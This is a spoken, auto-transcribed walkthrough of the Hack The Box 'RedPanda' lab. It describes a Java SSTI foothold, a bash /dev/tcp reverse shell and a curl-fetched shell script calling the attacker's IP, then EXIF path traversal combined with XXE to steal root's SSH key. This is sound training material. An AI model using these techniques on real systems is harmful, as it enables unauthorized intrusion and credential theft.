 what's going on YouTube this is ipsack me doing red panda from hack the box which probably isn't an easy machine it's in the medium difficulty just because the prevask but the foothold itself was super easy there's only one input on the web page and that is vulnerable to server-side template injection the trick here is there's a few banned characters but the actual ssti is in Java so you can do it without the Band characters and you can easily find the ssti if you just use like fuff and fuzz for all special characters once on the box the Prevost you have to find a Java application you have all the source code there and it's an XML and the injection except the twist is you have to trick the application into reading a file through lfi exif data manipulation and some other things um hopefully it makes sense once you watch the video so let's just get started as always start with the end map so Dash SC for default scripts SV enumerate versions oh a output all format that's planning the nmap director and call it red panda then the IP address of 10 10 11.170 this can take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on board 22 its Banner tells us it's an Ubuntu server the next one it doesn't tell us right away it just says the port is open and it's 8080. um it's the HTTP proxy port it's just a default and nmap if you look at the scripts it ran it's clearly a web server responding with an HTTP 200 then we have some HTML Source here I don't see like a server header or anything like that so I don't know what type of web server this is if it's Apache engine X Tomcat like there's Bunches of them so let's just take a look at the web page if I go to 10 10 11.170 uh oh we have to specify Port um 80 80. because that's what it's on and we get red panda search and this little box here it says search red panda I'm gonna search it for ipsec and it just returns zero so what I'm going to do is let's send this through burp sweet and the main reason is I just want an easy way to view all the server headers so if I do this I can look at it and I don't see anything that says what server it is if we send this with nothing it still does a 200 let's try doing a get request on this page we get a 405 um I don't know exactly what this is all the 400s are errors um HP code 405 is a specific error let's take a look at what it is HTTP status code 405. method not allowed I could have guessed that so we get a method not allowed message if we hit get on this but it gives a very clear error message um oh it said right here type meth and not allowed 405 but this white label error page always Google when you get like these type of Errors to see um if it can tell you anything about the web application and right now just knowing this error message that started with white label error page tells us it's likely spring boot which is going to be some type of java framework right so right now we have somewhat fingerprinted the application now the next step is probably going to be fuzzing this and my favorite way to fuzz things nowadays is using fuff because I found this one parameter that I use with SQL map all the time and that is to be able to have fuzz with a raw file so I'm just going to copy this request to a file let's go up put it in red panda and then I'm going to call this search dot request and if we look at this we see just the request I'm going to put fuzz here because I want to fuzz this parameter where name is if we do Dash h um let's see we can specify Dash request and dash request Proto so by default it's going to be https we want to change that to http so I'm going to do Pho Dash request search dot request Dash request Proto HTTP the word list opt SEC list and whenever I fuzz an endpoint I generally start with this special characters text file because it's going to go through all the special characters and uh just tell me things right I generally have to Discount the Ampersand because um this is what you use to separate arguments so if I just did name and like this um the web server is probably not picking it up because it expects a different argument to go here right because that's the separator so Ampersand generally a bad thing but um this can tell you a lot so right now I see 724 is what's appearing the most and if we just did one of these let's say a period to see exactly what happens so I'm going to search for period it's just this um their results so in buff I'm just going to do um FS for filter size and 724 . and then actually one other thing I like doing in Pho is um MC for match code because we can see by default fuff only matches these codes and I really hate that default but you can just do Dash MC all to match everything so that way if you return an error message like this one did where we have a squiggly bracket um it's mean something right so right now we have percent returning a 400 error which kind of makes sense um because if it's doing any type of URL encoding maybe it's expecting two digits to come after this like we can just filter four percent and oh banned character so wait that's not a 400 page name percent okay so what happened here was my browser did URL encoding most likely so um we just did a percent we get a bad request type 400. uh when I did it in the actual web browser it sent percent to five because it was URL encoding my input and this is a band character so uh let's see what is 727 we can look at exactly what that is by just sending it um I don't know what's the difference between that and the other thing like period these are turning different sizes but um they look the same I'm guessing maybe it does something to the HTML let's see Ctrl shift U H okay so it's doing entity encoding for that so that's why 727 is there so we can also filter size 727 to hide those uh I wonder I don't think we can do two 724 727 okay so you can separate filters with commas it looks like so let's take a look at what 755 is which is a dollar right uh we can just go back to the page go to search dollar and it's band character so move down 729 728 again it's probably going to be a lot of just HTML things I'm not going to go through all these but um the key one I believe is going to be um these squiggly brackets right because these are returning 500s let's see exactly what error message this returns uh let's see internal server error status 500. but generally when I see web pages error with um brackets my first gut reaction tells me that's going to be a server-side template injection if it failed with like a quote I would be thinking it is SQL injection if it failed with like a semicolon a pipe um actual ampersands I'd be thinking it's command injection right so I'm going down a ssti path and we know it's spring boot based upon the error message so I'm just going to do ssti spring boot actress right and we look at this let's see spring boot spring framework right here where is it come on and we got a payload right here spring framework Java so just copy this let's go back to the page it in it's going to exec ID so if I send this we have command so the very first thing I do is try to get a reverse shell so we're going to do bash Dash C then bash Dash I Dev TCP 10 10 14 8 90001 zerat and one like this and NC lvnp let's do it another window real quick 9001. so we have this listening and we didn't get a shell so there's a lot of bad characters with what we just sent so I'm going to simplify this and we're going to use Curl right so I should just be able to do curl 10 10 14 8 it's going to blister on Port 8000 I'm going to call it shell.sh okay so let's go make the dub dub dub go in this V shell.sh it can be Ben bash and then it's gonna do bash Dash I Dev TCP 10 10 14 8 9001 like that uh we have to start the web server and I also want to do a pipe to bash right because we want to execute whatever's on this page we do this and it says you search for this and we didn't actually execute anything um we got the output of this but it didn't execute so what I'm guessing is this whole exact thing doesn't obey pipes um we may be able to do like uh bash Dash C and do it this way so when I call bash and then have bash call curl and when we do this it didn't work at all um let's see we should just put this to uh repeater because that's going to be easier to manipulate see Ctrl shift U nope come on there we go on your link code so let's see what could we have screwed up because it did not even do a curl um I'm just gonna do bash Dash C and then paste this because I want to make sure this works so we're making this payload a bit simpler going to repeater and the whole bash thing to not work um maybe user bin curl you have to give a full pass I'm not sure why this is erroring 10 10 14 8.8 thousand I do have an A here no that's three a so that's colon that's URL encoding let's get rid of Bash that took a while and we have a request huh sh plus that we don't okay well let's just do a sane thing real quick and we're going to have this curl let's on URL encode this so it's easier to read and let's save this to Dev shm shell.sh so I'm going to take the file just write it to disk I think that had downloaded so now we can replace this with we can do an LS first to make sure the file exists I guess so lsla Dev shm look at it we can see shell.sh exist and our user is wooden K and our group is logs so we can see information about the file let's just do Dev shm l.sh execute it uh error let's make this executable chmod plus X send it I don't know why that failed if I do replace this with ID let's make sure payload still good bash Dev shm shell.sh there we go I just want to try one thing real quick because bash is working there but it didn't work before I'm going to replace the bash space with bash plus because that's how sweet was doing this URL encoding and let's see if it works it does okay I'm not sure why the whole like bash Dash C thing was not working but we now have a shell on the system uh before you get into anything too fancy I just want to show one more thing with this whole fuff because as I was thinking I missed one thing um we have this dollar and when I sent a dollar I got a um bad character so we can show this let's see search uh we have to get to a get there so if we do this we get banned character another good feature of fuff is we can do match R for our Mr for match regex and then just put the word that we want to match so band care and we can see all the Band characters um status has to be 200 so we could just remove the match all to get rid of the 400 and 500 but we can see these are the band special characters um not that it helps us here really because we already knew it was ssti but for future fuzzing that is a good tip I think so now that we're on this box let's just upgrade our shell so Python 3 import PTY pty.spawn then Bash then sdty raw minus Echo FG enter enter and I also want to look at this 26 rows 105 columns stty rows I always forget immediately 26 105. oh shoot s t t y Rose 26 Collins 105. and Export term is equal to X term there we go so when we drop the web shell we did notice something odd in Dev shm the group of a user is logs so if I do groups here I see logs so let's just see what this group actually does so I'm going to do find slash Dash group logs pipe errors to devnoll and hit enter and we can see right off the bat this weird directory opt Panda search and then something and then we have a bunch of files um so I'm going to go up and we're going to look at the panda search directory because we got this redpanda.log if I can it it is empty and we could take a look at it so let's just grep Dash R for redpanda.log in this directory and we can see it's used in this Java file this file writer new file Panda search.log so let's just see what's going on here um Panda report no um I'm just going to search for log I guess there we go redpanda.log so let's see we have a new file writer being created and the writing Response Code and then two pipes remote address two pipes user agent two pipes and the request URI to the file so that's weird because the file is empty maybe it's like getting cleared periodically we could run like piece by and take a look at it but um we could also just test right so I'm going to search for IP I search for IP and then I cap this file and we can see we have the status code my IP address my user agent and then the URI which was Slash search that is what I hit here so I could do please subscribe and we'll see if this hits the page I don't think it will because it returned like a 500 error right um actually no it does so uh 404s are logged we could play with this more um we did a get on search this was also an error this was 405 and we can see all of those so this does all go into the log file if we go up one directory we do have a few other directories um I don't know what cleanup.sh is it's just going to run I'm guessing a cron to remove a bunch of files so we can see like temp XML files removed vertemp Dev shm home wooden K just removing a bunch of things um what I'm more interested in is if this um red panda.log thing is used elsewhere so I'm going to do the same grep so redpanda.log and slash opt and we've already looked at this Panda search directory so we don't care about it we have the credit score so I'm going to copy this and we can view what this file looks like I'm going to just start off by searching for panda.log because that is the main thing we care about exactly what happens to this file we see it's in the main function so that's the heart of this Java application um it's opening the file and giving it the log FD and we can see it's creating this log reader thing to read it and then going through this file line by line okay so every line it's going to check is this an image and if we look at is image we see all it's doing is checking if it ends in JPEG and remember this is the line um let's see do we still have if I search up for this um we can just grab this come on Echo maybe I put in single quotes it'll work better so this is the line it's just making sure this ends in dot jpeg so right now that's error it definitely does not end in jpeg so it would not go on to this function okay so the next thing we have let's see what is it is image so if it is it's going to um parse log so if I look at first log it's going to create a hash map which is like a fancy list or array or something but um it's going to split the line on double pipes which is what we saw and then the very first field is going to get assigned to status code then IP then user agent then URI so nothing too interesting there it's just splitting and defining things so we can call it later this system dot out kind of like a debug thing we can ignore it because all it's doing is printing the URI to standard out which we don't see then it's going to get artist on the URI so this is the file name to the web server we requested and it's going to call get artist so if I look at this we see it's going to go into opt Panda search Source main resource static and then add the URI so the URI is going to begin with a slash as we saw like slash error so it goes static slash so this is a directory and this is where I guess jpegs are because to get to this part of the function it has to end in dot jpeg and what it's going to do is call jpeg metadata reader which is like an exif tool thing and get the field artist and it's going to return the description of what the artist field is in the metadata of this and if there is no artist it's going to return an a so okay let's just go back to where we were so right here we know let's just um getting the metadata of an image and then this string XML path it's going into slash credits slash artist underscore creds.xml and then it's going to do add view so hold on one second let's just take some quick notes um let's see one get artist metadata from this name.jpg okay and then two it's going to grab artist out of creds grab s artist underscore cred.xml and artist is the variable here okay and then what is it going to do with this and it's creds I don't want to mess that up so let's look at add view two to see what this does so this is gonna go with a bunch of XML things and whenever you see XML in a CTF or something like that or actually when you see XML period you should think something of XML and the injection right so it's got two functions um but not two functions two variables path and URI path is going to be the XML file URI is let's see what is URI um if we go back down your eye is going to be the URI which I think is the artist name yeah the artist name okay and then it's going to do something to print total views or something like that so looking at my notes let's just go and look at two files so the first thing I want to go into is the um opt Panda search Source main resource static so let's take a look at this so CD Panda search source Main resources static I want to say and then was it image see it does not say anything I'm going to guess it's an image so if we go in image then we have a bunch of images um I wonder on this is it like a slash image jpeg yeah so there is images in this directory and I bet if we save this it's going to have some type of artist name in the exif data so come on there we go downloads shy move it here exit tool and we can see the artist is Damien so it does have that field foreign so what we want to do is rewrite that field because what this is doing is later it uses that and this grab grab crads whatever it's going to do creds then Damien underscore creds.xml most likely let's take a look so if I go into slash credits oh it's credits not creds okay we can look at that XML file and we see it right so this is what it's loading for whatever stats it's doing it did have something for turtle views and that gets incremented right so what we have is we can manipulate this um or actually can we just write to this directory touch test we can't so we can't write to slash credits let's just fix that so since we can't write here but we can control the artist name we can do an lfi so we can change this so exit tool Dash artist or I think we can do it this way Dash artist is equal to let's change it to up One Directory Dev shm ipsec onshine so now when I run this exif tool we see this is what the artist says so what we're doing here is we modify this so it's going to go credits then up One Directory then Dev shm and then ipsec underscorecreds.xml the reason why I'm using Dev shm is two reasons number one I don't have to worry about cleaning up this directory because it's going to get deleted on the next reboot number two is a lot of Linux systems have um private temp directories and system D so if this was a service and I've just dropped the file to slash Temp and the Apache web server whatever is running it may have a different slash temp so I always hate using temp because of that whole private jails concept of systemd um so now we have this file let's copy shy to dub dub dub make sure this is the right one it is I'm just going to move shy JPEG and we'll call it ipsec.jpg as well and we'll start a web server here and I'm going to go to Dev shm W get 10 10 14 8 8 000 ipsec.jpg okay so we have this now we need to make that XML file and the quickest way we can do that is just copying it so we can just copy this copy and I'll call this ipsec creds dot XML paste and we want to put xxe here so I'm just going to Google xxe template hack tricks and I'm sure we'll find something real quick XML enemy injection [Music] and let's see this is what we want where is it this ooh EXT K okay so if I just paste this and I'm going to rename EXT to xxe just so it's a bit more obvious this is going to be a variable that is the results of this and I'm going to check if root dot SSH idrsa is in this thing um we probably should check like Etsy pass WD first to make sure it works but I'm lazy so what we're going to bank on is the application opening this XML file and then when it saves it it just follows this entity and writes it so it doesn't really matter what we do with it I'm just going to name this data I guess and then we do and xxe semicolon because that's how you include things from this and I really hope this is going to work and the other reason you'd want to just have this run as um or like Etsy passive BD because you may not be running as root the reason why I know I'm root is if we looked at the credits directory we can see only root can write there uh credits yeah only root rights there so it's a relatively safe assumption that if there is a crime here it's running as root um author I can change this to ipsec just in case it matters and then the URI uh we're gonna put oh what is your eye yeah we can do it now three four five six we'll do six Dev shm ipsec.jpg not a hundred percent positive this matters maybe it does um actually the URI needs to begin with a slash because the other thing we're going to do is go into opt Panda search and we want to cat redpanda.log uh do we have an echo here we don't let's just grab this or a shy.jpg so what we want to do is change the file name so Echo and we're going to do slash and a bunch of dot dot slashes I think I did six before so one two three four five six ipsec.jpg two redpanda.log and then we're gonna wait a little bit we can cat redpanda.log to see if anything happens but nothing is so what we're hoping for here is the KRON runs it's going to grab this see the URI try to navigate to the file and then end up going to ipsec.jpg uh oh whoops oh we need Dev shm Dev shm there we go so we're gonna hope it goes I don't know what I just clicked but to this file and now if I LS we can see it exist and when it does an exif tool on this file do we have that command we don't um we can probably xxd it potentially uh uh what do we call it I dot p so when it um loads this it goes to dot dot slash Dev shm ipsec underscore creds.xml opens up that XML file uh ipsec threads XML it's going to oh it already did it opens it up and then um because we had the XML entity at the top which I think got erased because I don't see it I just see doctype Foo I don't see the actual entity we placed here um it just writes it out so we have a root key here I can copy this and we can test it out so V let's get out of a dub dub dub B root dot key paste s uh chmod 600 root key asset a SSH I root at 10 10 11 170. yes and we are now root on red panda and we can look at the Run credits thing exactly see exactly what it does but yep that is the box but not just the video because I want to go into one thing I found really interesting about this we didn't run into the problem because I was in this whole netcat session the time but if we decided to do what most people do um let's see make their SSH go in here and generate a key save it and then CP idrsa dot Pub to authorize keys and log in as this user so let's copy this come on okay that has been copied V wuden K dot key paste chmod 600 sh Dash I for this user 170. I think I had the username correct maybe not um w-o-o-d-e-n-k it's mod 600. I hope I did authorize keys right try this again uh who am I just so I can easily copy this huh I wonder if it's the group CH own Dash r 1K wooden k because it's owned by the group logs so maybe that's it uh permission denied what C dot SSH oh um chmod 700.sh I don't have the executable permission on the directory so I can't enter it um it's always an odd one so files you want 600 uh directories you want 700. chmod 600 I think I just did that again let's do 600 star and CH own 1K 1K on everything now let's try that was it so it was the logs thing that was annoying but if I look I don't have the logs Group which is weird right so if I cat Etsy group we can see logs is group ID 101 and it doesn't have any users in it if I look at wooden by uid and group is 1000 so he's not actually a member of this group yet a netcat shell has him in that group um so what's going on here if we do contact L we can see this is how the web server starts so on reboot it's going to use sudo to switch to wooden K and then assign the logs group to him and execute this jar so because the pseudo is doing the dash G logs that's what gives us that logs permission um hopefully that makes sense and you guys found it interesting because I did too I've never seen this behavior before definitely intended I just didn't know you could like set a group via sudo so um that'd be the Box hope you guys enjoyed it take care and I will see you all next time